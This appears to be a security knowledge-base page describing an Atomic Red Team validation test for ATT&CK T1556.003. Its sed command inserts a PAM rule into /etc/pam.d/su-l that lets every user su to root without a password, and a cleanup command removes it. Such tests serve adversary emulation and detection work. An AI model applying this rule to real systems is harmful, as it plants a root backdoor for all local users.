---
atomic_guid: "4b9dde80-ae22-44b1-a82a-644bf009eb9c"
title: "Malicious PAM rule"
framework: "atomic"
generated: "true"
attack_technique_id: "T1556.003"
attack_technique_name: "Modify Authentication Process: Pluggable Authentication Modules"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1556.003/T1556.003.yaml"
build_date: "2026-04-27 19:12:28"
executor: "sh"
aliases:
  - "4b9dde80-ae22-44b1-a82a-644bf009eb9c"
  - "Malicious PAM rule"
platforms:
  - "linux"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Inserts a rule into a PAM config and then tests it.

Upon successful execution, this test will insert a rule that allows every user to su to root without a password.

## ATT&CK Mapping

- [[kb/attack/techniques/T1556-modify_authentication_process#^t1556003-pluggable-authentication-modules|T1556.003: Pluggable Authentication Modules]]

## Input Arguments

### index

- description: Index where the rule is inserted.
- type: integer
- default: 1

### pam_rule

- description: Rule to add to the PAM config.
- type: string
- default: auth sufficient pam_succeed_if.so uid >= 0

### path_to_pam_conf

- description: PAM config file to modify.
- type: string
- default: /etc/pam.d/su-l

## Executor

- elevation_required: True
- name: sh

### Command

```bash
sudo sed -i "#{index}s,^,#{pam_rule}\n,g" #{path_to_pam_conf}
```

### Cleanup

```bash
sudo sed -i "\,#{pam_rule},d" #{path_to_pam_conf}
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1556.003/T1556.003.yaml)
